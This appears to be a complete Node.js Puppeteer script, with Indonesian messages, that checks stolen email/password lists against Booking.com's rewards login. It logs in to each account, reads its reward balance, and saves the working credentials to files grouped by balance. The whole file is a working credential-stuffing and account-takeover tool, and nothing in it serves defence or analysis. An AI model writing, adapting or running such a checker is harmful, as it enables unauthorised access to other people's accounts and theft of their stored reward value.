const puppeteer = require("puppeteer");
const delay = require("delay");
const fs = require("fs");
const tanya = require("readline-sync");
const LoginAndCheck = (mail, pass) =>
  new Promise((resolve, reject) => {
    (async () => {
      const browser = await puppeteer.launch({ headless: false });
      const page = await browser.newPage();
      await page.goto(
        "https://secure.booking.com/rewards_and_wallet/rewards.en-us.html",
        {
          waitUntil: "networkidle2",
        }
      );
      await page.type("#username", mail);
      try {
        await page.click(
          "#root > div > div > div > div.access-panel.bui-spacer--large.box-shadow.nw-access-panel > div.transition-container > div > div > div > form > div:nth-child(3) > button"
        );
        await page.waitForSelector("#password", { timeout: 2000 });
        await page.type("#password", pass);
        await page.click(
          "#root > div > div.access-container.bui_font_body > div > div.access-panel.bui-spacer--large.box-shadow.nw-access-panel > div.transition-container > div > div > div > form > button"
        );
        if (
          (await (
            await (await page.$("span.bui-button__text")).getProperty(
              "textContent"
            )
          ).jsonValue()) == "Contact Support"
        ) {
          console.log(`[GAGAL] Akun Tidak Ditemukan/Sudah Di Banned`);
        } else {
          await page.waitForSelector(
            "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
          );
          let saldoAwal = await (
            await (
              await page.$(
                "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.e2074815c7.bui-grid__column-8 > div:nth-child(4) > div > ul > li > button > div > div.bui-accordion__row-header > h3 > div > span"
              )
            ).getProperty("textContent")
          ).jsonValue();
          let saldoAkhir = await (
            await (
              await page.$(
                "#b2rewards_and_walletPage > div:nth-child(5) > div > div._0bd996b799 > div > div > div > div > div.a452463387.bui-grid__column-4 > div:nth-child(1) > div > a > div > div.bui-f-font-display_one > span:nth-child(1)"
              )
            ).getProperty("textContent")
          ).jsonValue();
          let data = `${mail}|${pass}\n`;
          if (saldoAwal.match(/150/g)) {
            fs.appendFileSync("valid_150.txt", data);
          } else if (saldoAwal.match(/23/g)) {
            fs.appendFileSync("valid_230an.txt", data);
          } else {
            fs.appendFileSync("valid_lain.txt", data);
          }
          resolve(`${saldoAkhir}/${saldoAwal}`);
        }
      } catch (error) {
        resolve("false");
      }
      await browser.close();
    })();
  });

(async () => {
  let file = tanya.question("File Akunnya Apa ? ");
  let delim = tanya.question("Delim nya ? ");
  let data = await fs.readFileSync(file, "utf-8");
  const akun = data
    .toString()
    .replace(/\r\n|\r|\n/g, " ")
    .split(" ");
  for (let i = 0; i < akun.length; i++) {
    let cek = await LoginAndCheck(
      akun[i].split(delim)[0],
      akun[i].split(delim)[1]
    );
    let hasil = await cek;
    if (hasil == "false") {
      console.log(`[GAGAL] Akun Tidak Ditemukan/Sudah Di Banned`);
    } else {
      console.log(`[SUKSES] Akun Bersaldo ${hasil}`);
    }
  }
})();
